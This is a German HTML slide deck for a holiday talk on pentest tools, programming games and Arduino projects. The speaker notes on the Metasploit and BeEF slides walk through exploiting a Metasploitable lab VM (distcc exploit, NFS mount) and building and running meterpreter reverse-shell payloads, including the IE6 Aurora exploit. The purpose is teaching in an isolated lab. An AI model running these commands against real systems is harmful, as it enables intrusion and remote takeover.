@@ -1,0 +1,567 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Geekige Weihnachtstage</title>
+
+		<meta name="description" content="Geekige Weihnachtstage - was tun außer Plätzchenessen">
+		<meta name="author" content="Stefan Schlott">
+
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+		<link rel="stylesheet" href="css/reveal.min.css">
+		<link rel="stylesheet" href="css/theme/cccs.css" id="theme">
+
+		<!-- For syntax highlighting -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- If the query includes 'print-pdf', use the PDF print sheet -->
+		<script>
+			document.write( '<link rel="stylesheet" href="css/print/' + ( window.location.search.match( /print-pdf/gi ) ? 'pdf' : 'paper' ) + '.css" type="text/css" media="print">' );
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+			<div class="slides">
+
+				<section data-state="chapter">
+          <div class="title">
+            <img class="header" src="lib/img/title.jpg" />
+            <div class="belowheader">
+              <h1>Geekige Weihnachtstage</h1>
+              <h3>Was tun außer Plätzchenessen</h3>
+            </div>
+          </div>
+				</section>
+
+        <section>
+					<section data-state="chapter">
+            <div class="fill">
+              <h2>L33t H4x0r-Tools (doh!)</h2>
+              <img src="lib/img/h4x0rt00lz.jpg" />
+            </div>
+					</section>
+
+					<section>
+            <div class="fill">
+              <h2>Warning</h2>
+              <img src="lib/img/warning.jpg" />
+              <h2 style="text-align:right">Try this at home... only at home</h2>
+            </div>
+					</section>
+
+          <section>
+            <div class="fill darkbg">
+              <h2>Backtrack - Live CD</h2>
+              <img src="lib/img/backtrack.jpg" />
+              <p><a href="http://www.backtrack-linux.org/">Live-CD</a> mit unglaublichen Mengen an Tools</p>
+              <p>Laut <a href="http://de.wikipedia.org/wiki/BackTrack">Wikipedia</a> ist scheinbar
+                <a href="http://packetstormsecurity.org/files/author/2096/">einer der Autoren</a>
+                <a href="https://netzpolitik.org/2012/gamma-group-international-ltd-briefkastenfirma-des-staatstrojaner-unternehmens-in-steueroase-enttarnt/">Teilhaber der „Finfisher“-Firma</a>
+                (wäre stimmig mit der <a href="http://www.heise.de/newsticker/meldung/Deutsche-Ueberwachungssoftware-fuer-aegyptische-Staatssicherheit-1203161.html">Aussage von Heise</a>,
+                FinFisher würde auf Backtrack beruhen)... you have been warned ;-)
+              </p>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Eine Menge cooles (neues?) Spielzeug</h2>
+              <p>Metasploit - das „Schweizer Taschenmesser“ des Pentestings</p>
+              <p>BeEF - warum XSS-Lücken immer schlimm sind</p>
+              <p>subterfuge - Man-in-the-Middle Point-and-Click</p>
+              <p>...</p>
+            </div>
+					</section>
+
+					<section>
+            <div class="normal">
+              <h2>„Opfer“-Systeme</h2>
+              <p>Spätestens hier: Vorsicht, nicht direkt ans Netz hängen :-)</p>
+              <p>Klassiker: <a href="http://sourceforge.net/projects/metasploitable/">Metasploitable</a></p>
+              <p>Vorteil: Hierfür gibt es reichlich <a href="https://community.rapid7.com/docs/DOC-1875">Dokumentation</a> und <a href="http://www.offensive-security.com/metasploit-unleashed/Introduction">Tutorials</a></p>
+              <p>...oder eine alte Windows-CD</p>
+              <p class="fragment">(ok, das ist dann wie kleine Kinder schlagen)<br/>
+                <span class="fragment">(ist aber trotzdem lustig)</span>
+              </p>
+            </div>
+					</section>
+
+					<section>
+            <div class="normal">
+              <h2>Einrichtung von VirtualBox</h2>
+              <p>Kaum jemand hat drei Rechner „übrig“: Virtuelle Maschinen</p>
+              <p>VMs sollen sich gegenseitig sehen, aber nicht das Internet erreichen</p>
+              <ul>
+                <li>Einrichtung eines Host-Only-Interfaces vboxnet0 (File/Preferences/Network)</li>
+                <li>Netzwerkeinstellungen aller VMs: Host-Only, Interface vboxnet0</li>
+                <li>Kommunikation mit Host-System: Interface vboxnet0 manuell konfigurieren</li>
+              </ul>
+            </div>
+					</section>
+
+					<section>
+            <div class="normal">
+              <h2>Metasploit<img class="float-right" src="lib/img/metasploit-logo.png" /></h2>
+              <p>Umfassendes Pentesting und Exploit Tool</p>
+              <p>Ursprungsidee: Exploits werden aus Komponenten kombiniert:
+                <ul>
+                  <li>Der eigentliche Exploit</li>
+                  <li>Payload (was ausgeführt wird)</li>
+                  <li>Obfuscation, IDS prevention, etc.</li>
+                </ul>
+              </p>
+              <p>...das ganze modular und einfach erweiterbar.</p>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Metasploit</h2>
+              <p>Gewachsen zu einem umfassenden Pentesting-Tool:
+                <ul>
+                  <li>Verwaltung von Payload-Verbindungen (Meterpreter Shells)</li>
+                  <li>„Tunneln“ von Metasploit durch einen gePWNten Rechner (Pivoting)</li>
+                  <li>Integration diverser Tools (Scanner, Fuzzer)</li>
+                  <li>Protokollierungsmöglichkeiten</li>
+                  <li>Uvm.</li>
+                </ul>
+              </p>
+            </div>
+            <aside class="notes">
+              Scan und Exploit von Metasploitable
+              <ul>
+                <li>msfconsole</li>
+                <li>db_nmap -sS -A -p 0-65535 -T4 192.168.56.103 → nmap mit host detection, agressive (fast)</li>
+                <li>hosts → Host ist in der DB eingetragen</li>
+                <li>services → Ergebnis des Scans</li>
+                <li>search nfs → nach Modulen suchen, die mit nfs zu tun haben</li>
+                <li>user auxiliary/scanner/nfs/nfsmount → nfs-Scanner</li>
+                <li>show options → Parameter des Moduls</li>
+                <li>set RHOSTS 192.168.56.103 → Zielhost setzen</li>
+                <li>run → Starten. Oh, der Host exportiert NFS schreibbar :-)</li>
+                <li>An der Konsole: Temporäres Verzeichnis anlegen; mounten: mount -t nfs 192.168.56.103:/ /mnt/tmp</li>
+                <li>search distcc</li>
+                <li>use exploit/unix/misc/distcc_exec</li>
+                <li>show options</li>
+                <li>show targets</li>
+                <li>show payloads</li>
+                <li>exploit</li>
+                <li>ctrl-z → session in background</li>
+                <li>Konsole: msfpayload linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=12345 R | msfencode -t elf -o revshell</li>
+                <li>Konsole: base64 revshell → Ausgabe in Zwischenablage</li>
+                <li>use exploit/multi/handler</li>
+                <li>set payload linux/x86/meterpreter/reverse_tcp</li>
+                <li>set LHOST 192.168.1.101</li>
+                <li>set LPORT 12345</li>
+                <li>exploit -j</li>
+                <li>sessions -i 2 → Session zurückholen</li>
+                <li>echo (base64-Ausgabe) | base64 -d &gt; revshell</li>
+                <li>chmod +x revshell</li>
+                <li>./revshell</li>
+              </ul>
+            </aside>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>BeEF: Browser Exploitation Framework</h2>
+              <p>Webanwendung: Liefert „Hook“ und Management-Konsole aus</p>
+              <p>Hook auf fremde Seite „einbauen“ (XSS, modifizierte Webseite, etc.)</p>
+              <p>Modular aufgebaut, einfach erweiterbar</p>
+              <p>Skriptbar über REST-API</p>
+            </div>
+            <aside class="notes">
+              <ul>
+                <li>BeEF in Backtrack: /pentest/web/beef</li>
+                <li>Alte beef.db löschen (vorherige Sessions)</li>
+                <li>Metasploit-Integration aktivieren: config.yaml extension/metasploit/enable</li>
+                <li>Metasploit-Extension konfigurieren: extensions/metasploit/config.yaml, Passwort, host und callback_host setzen</li>
+                <li>Metasploit starten (msfconsole), BeEF-RPC laden: load msgrpc ServerHost=remote-shell-ip Pass=abc123</li>
+                <li>Aurora-Exploit gegen IE6:
+                <ul>
+                  <li>Metasploit: use exploit/multi/handler; set LPORT 4444</li>
+                  <li>BeEF: Metasploit/Internet Explorer Aurora; Payload: windows/meterpreter/reverse_tcp; EXITFUNC: process</li>
+                </ul>
+                </li>
+              </ul>
+            </aside>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Subterfuge</h2>
+              <p>Weboberfläche für diverse SSL-MitM-Tools</p>
+              <p>Unter der Haube: „Alte Bekannte“ wie SSLStrip, etc.</p>
+              <p>Wieder Metasploit-Integrationsmöglichkeit ;-)</p>
+            </div>
+            <aside class="notes">
+              Starten mit subterfuge -s 192.168.56.101:3001
+            </aside>
+          </section>
+				</section>
+
+
+        <section>
+					<section data-state="chapter">
+            <div class="fill">
+              <h2>Sprachen lernen!</h2>
+              <img src="lib/img/neuesprachen.png" />
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Programmierspiele</h2>
+              <p>Spielend lernen durch Programmierspiele :-)</p>
+              <p>Idee: Motivation durch konkretes Projekt, Wettstreit mit anderen</p>
+              <p><a href="http://programminggames.org/">Reichlich Auswahl</a></p>
+              <p>Klassiker: <a href="http://www.koth.org/">Core Wars</a> (beschrieben im Scientific American 1984), eigener Assembler-Dialekt</p>
+              <p>Heute: In verschiedenen Hoch- und Skriptsprachen</p>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <center>
+                <a href="http://robocode.sourceforge.net/"><img src="lib/img/robocode_logo_tanks.png" style="width:50%" /></a><br />
+                <img src="lib/img/robocode-screenshot.png" style="width:80%" />
+              </center>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Robocode</h2>
+              <p>Plattformen: JVM, .net</p>
+              <p>Ziel: Gegnerische Roboter ausschalten</p>
+              <p>Modi: 1:1, Gruppenkampf, etc. - es gibt laufende Ligen</p>
+              <p>Roboter = Radar + Fahrwerk + Kanone<img src="lib/img/robocode-anatomy.jpg" class="float-right" /></p>
+              <p>Aktionen:
+                <ul>
+                  <li>Radar/Kanone/Fahrwerk drehen</li>
+                  <li>Vorwärts/rückwärts fahren</li>
+                  <li>Kanone abfeuern</li>
+                </ul>
+              </p>
+              <p>Spielfeld nicht diskret, Limitierungen durch Spielphysik</p>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>My first robot</h2>
+              <p>Viel Doku im <a href="http://robowiki.net">Robo-Wiki</a></p>
+              <p>Für nicht-Java-Sprachen: Entsprechende Libraries zum Classpath von Robowars hinzufügen</p>
+              <p>Compile-Ergebnis: Directory unter Options/Preferences/Development Options aufnehmen</p>
+              <pre><code class="Java">public class MyFirstRobot extends Robot {
+  @Override
+  public void run() {
+    setAdjustRadarForGunTurn(false);
+    while (true) {
+      turnGunLeft(10.0);
+    }
+  }
+
+  @Override
+  public void onScannedRobot(ScannedRobotEvent event) {
+    fire(1.0);
+  }
+}</code></pre>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Scalatron</h2>
+              <center>
+                <a href="http://scalatron.github.com/"><img src="lib/img/scalatron.png" style="width:90%" /></a>
+              </center>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Scalatron</h2>
+              <p>Speziell zum Erlernen von Scala</p>
+              <p>Vorteil: „All in one“, keine separate IDE nötig</p>
+              <p>Ziel: Möglichst viel Energie sammeln</p>
+              <p>Bots und Mini-Bots: Steuerbare Entitäten</p>
+              <ul>
+                <li>Bots können Mini-Bots spawnen</li>
+                <li>Übertragen dabei eine gewisse Energiemenge</li>
+                <li>Mini-Bots benötigen stetig Energie</li>
+              </ul>
+              <p>Fluppets und Snorgs: Gute und böse Tiere (bewegen sich, erhöhen/reduzieren Energie)</p>
+              <p>Zugars und Toxifera: Gute und böse Pflanzen</p>
+              <p>Spielfeld diskret, begrenzte Sichtweite der Bots/Minibots</p>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Scalatron</h2>
+              <p>Kommunikation mit Textprotokoll: <pre>Command(key=value,...)|Command(...)|...</pre></p>
+              <p>Kommandos:</p>
+              <ul>
+                <li>Move(direction=dx:dy)</li>
+                <li>Spawn(direction=dx:dy,name=string,energy=int,...)</li>
+                <li>Set(key=value,...) (werden mit React mitübergeben)</li>
+                <li>Explode(size=int) (nur Mini-Bots)</li>
+                <li>„Debugging-Tools” Log, Say, Status, MarkCell, ...</li>
+              </ul>
+              <p>Infos:</p>
+              <ul>
+                <li>Welcome, Goodbye (mit Statusinfos)</li>
+                <li>React (Infos über Umgebung, Energiepegel, Kollisionsereignis, etc.)</li>
+              </ul>
+            </div>
+          </section>
+        </section>
+
+
+        <section>
+					<section data-state="chapter">
+            <div class="fill">
+              <h2>Hardware für Programmierer</h2>
+              <img src="lib/img/hardware.jpg" />
+            </div>
+          </section>
+
+					<section>
+            <div class="fill">
+              <img src="lib/img/lightbulb.jpg" />
+              <br />
+              <br />
+              <br />
+              <p style="width:50%">Wieviele Programmierer braucht man, um eine Glühbirne zu wechseln?</p>
+              <br />
+              <br />
+              <p class="fragment" style="position:absolute; left:60%; width:40%">Ein Programmierer würde nie etwas anfassen, das mit Hardware zu tun hat.</p>
+            </div>
+          </section>
+
+					<section>
+            <div class="fill">
+              <h2>Der Arduino!</h2>
+              <img src="lib/img/arduino.jpg" />
+              <p>Open-Source-Hardware- und Software-Plattform für Physical Computing</p>
+              <p>ATmega-CPU, typisch 32 kB Flash, 2 kb RAM</p>
+              <p>Verschiedenste Versionen und Nachbauten</p>
+              <p>Boot Loader zum Flashen von Software via USB</p>
+              <p>„Robuste“ Bauteile verzeihen Fehler und Ungenauigkeiten</p>
+              <p>Rapid Prototyping für alle möglichen Ideen in Hardware</p>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>...und eine Reihe Seelenverwandter</h2>
+              <p>Arduino-Variationen und ähnliche Plattformen:</p>
+              <ul>
+                <li><a href="http://www.tinkerforge.com/">Tinkerforge</a> (Schwerpunkt Module)</li>
+                <li><a href="http://smartduino.com/">Smartduino</a> (Arduino stärker modularisiert, Modul-Bus)</li>
+                <li><a href="http://www.pjrc.com/teensy/teensyduino.html">Teensyduino</a> (Arduino mit USB HCI)</li>
+                <li><a href="http://arduino.cc/en/Main/ArduinoBoardLilyPad">LilyPad</a> (Arduino speziell für Wearable Computing)</li>
+                <li>...</li>
+              </ul>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>„Breadboard“ statt Löten</h2>
+              <p>Stecken von Kabeln und Bauteilen</p>
+              <p>Breadboard erzeugt Kontakte</p>
+              <p>Ermöglicht schnelles und einfaches Ausprobieren</p>
+              <center><img style="width:50%" src="lib/img/breadboard.jpg" /></center>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Shields - für komplexere Erweiterungen</h2>
+              <p>Aufstecken auf Arduino-Board</p>
+              <p>Für Software: Meist zugehörige Library</p>
+              <p>Großes Ökosystem an Anbietern</p>
+              <center>
+                <img style="width:47%" src="lib/img/shields1.jpg" />
+                <img style="width:47%" src="lib/img/shields2.jpg" />
+              </center>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Makey Makey</h2>
+              <p>Noch weniger Hardwarekontakt!</p>
+              <center>
+                <video controls="controls" class="video-stream html5-main-video" x-webkit-airplay="allow" data-youtube-id="rfQqh7iCcOU" tabindex="0" src="http://r11---sn-i5h7ln76.c.youtube.com/videoplayback?upn=BXxx1SISXJQ&sparams=cp%2Cid%2Cip%2Cipbits%2Citag%2Cratebypass%2Csource%2Cupn%2Cexpire&fexp=927101%2C926400%2C925705%2C904822%2C916612%2C922401%2C920704%2C912806%2C925703%2C928001%2C922403%2C922405%2C929901%2C913605%2C913546%2C913556%2C920201%2C901632%2C911116%2C901451%2C902556&key=yt1&expire=1355346464&itag=43&ipbits=8&sver=3&ratebypass=yes&mt=1355321233&ip=80.187.80.224&mv=m&source=youtube&ms=au&cp=U0hUSlNPVF9LTkNONF9LSVhFOm52Qk95UHFmRHdv&id=adf42a87b88270e5&newshard=yes&signature=B084D631ED2FF57C606BB80BA80CCA5040712E5B.92379706FD5B623E03D3E16483A7F54F27E8C8F1" style="width: 640px; height: 360px; left: 0px; top: 0px;"></video><br />
+                <a href="http://www.youtube.com/watch?feature=player_embedded&v=rfQqh7iCcOU" style="font-size:40%">(Video bei Youtube)</a>
+                <!-- iframe width="560" height="315" src="http://www.youtube-nocookie.com/embed/rfQqh7iCcOU" frameborder="0" allowfullscreen></iframe -->
+              </center>
+              <p>Meldet sich als USB-Tastatur.</p>
+              <p>Arduino-basiert, kann programmiert werden.</p>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Ideen: Build Server Status Traffic Lights</h2>
+              <center>
+                <a href="http://www.instructables.com/id/Arduino-stoplight-web-server/"><img style="width:90%" src="lib/img/trafficlights.jpg" /></a>
+              </center>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Ideen: Der etwas andere Wecker</h2>
+              <center>
+                <a href="http://nootropicdesign.com/projectlab/2011/09/05/defusable-clock/"><img style="width:90%" src="lib/img/dynamitealarmclock.jpg" /></a>
+              </center>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Ideen: Steuerung für Dronen/Copter<br/>(Ardupilot)</h2>
+              <center>
+                <a href="http://www.darwinaerospace.com/burritobomber"><img style="width:90%" src="lib/img/burritobomber.jpg" /></a>
+              </center>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Ideen: Laserharfe</h2>
+              <center>
+                <a href="http://www.stephenhobley.com/blog/laser-harp-2009/"><img style="width:45%" src="lib/img/laserharp.jpg" /></a>
+              </center>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Ideen: Reverse Geocache</h2>
+              <br />
+              <br />
+              <center>
+                <a href="http://arduiniana.org/projects/the-reverse-geo-cache-puzzle/"><img style="width:47%" src="lib/img/reversegeocache1.jpg" /></a>
+                <a href="http://arduino.cc/forum/index.php/topic,8867.0.html"><img style="width:47%" src="lib/img/reversegeocache2.jpg" /></a>
+              </center>
+            </div>
+          </section>
+
+					<section>
+            <div class="normal">
+              <h2>Software in C</h2>
+              <p>Arduino-IDE vereinfacht Cross-Kompilierung und Upload</p>
+              <p>Alternative Eclipse-IDE</p>
+              <p>...oder auf die Kommandozeilen-Tools zugreifen (gcc)</p>
+              <p>Statt <code>main(int,char**)</code>: <code>setup()</code> und <code>loop()</code></p>
+              <pre><code class="c">
+int ledPin1 = 13;
+
+void setup() {
+  // Initialisierung
+  pinMode(ledPin1, OUTPUT);
+}
+
+void loop() {
+  // Ausführung in Endlosschleife
+  digitalWrite(ledPin1, HIGH);
+  delay(500);
+  digitalWrite(ledPin1, LOW);
+  delay(500);
+}
+              </code></pre>
+            </div>
+          </section>
+        </section>
+
+
+				<section>
+          <div class="fill">
+            <img src="lib/img/froheweihnachten.jpg" />
+            <h1>Frohe Weihnachten!</h1>
+          </div>
+				</section>
+
+        <section>
+          <div class="normal">
+            <h3>Bildnachweise</h3>
+            <ul>
+              <li>arduino.jpg <a href="http://www.flickr.com/photos/robives/5565053515/">robives CC BY-NC-SA</a></li>
+              <li>breadboard.jpg <a href="http://www.flickr.com/photos/eagletusk/6333164733/">eagletusk CC BY</a></li>
+              <li>froheweihnachten.jpg <a href="http://www.flickr.com/photos/simmogl/6463529685/">simmogl CC BY-NC</a></li>
+              <li>h4x0rt00lz.jpg <a href="http://www.flickr.com/photos/brianklug/6870002408/">brianklug CC BY-NC</a></li>
+              <li>lightbulb.jpg <a href="http://www.flickr.com/photos/topguy/2775133355/">topguy CC-BY-NC-SA</a></li>
+              <li>shields1.jpg, shields2.jpg <a href="http://www.flickr.com/photos/tronixstuff/4659523170/">tronixstuff CC BY-NC-SA</a></li>
+              <li>title.jpg <a href="http://www.flickr.com/photos/rickenharp/73472971/">rickenharp CC BY-NC</a></li>
+              <li>warning.jpg <a href="http://www.flickr.com/photos/pearsongraphics/4703064688/">pearsongraphics CC BY-NC-ND</a></li>
+              <li>Logos und Screenshots: Von den entsprechenden Projektseiten</li>
+              <li>Arduino-Projektbeispiele: Von den verlinkten Seiten</li>
+            </ul>
+          </div>
+        </section>
+
+        <section>
+          <div class="normal">
+            <br />
+            <br />
+            <center><img src="lib/img/cc.logo.svg" class="centered" width="50%" /></center>
+            <br />
+            <p>This work is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 3.0 Unported License.</p>
+            <br />
+            <center><a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/"><img alt="Creative Commons License" class="centered" src="lib/img/cc.by-nc-sa.eu.svg" width="30%" /></a></center>
+          </div>
+        </section>
+
+			</div>
+
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.min.js"></script>
+
+		<script>
+
+			// Full list of configuration options available here:
+			// https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
+				transition: Reveal.getQueryHash().transition || 'linear', // default/cube/page/concave/zoom/linear/none
+
+				// Optional libraries used to extend on reveal.js
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/showdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+					{ src: 'plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
+					// { src: 'plugin/remotes/remotes.js', async: true, condition: function() { return !!document.body.classList; } }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
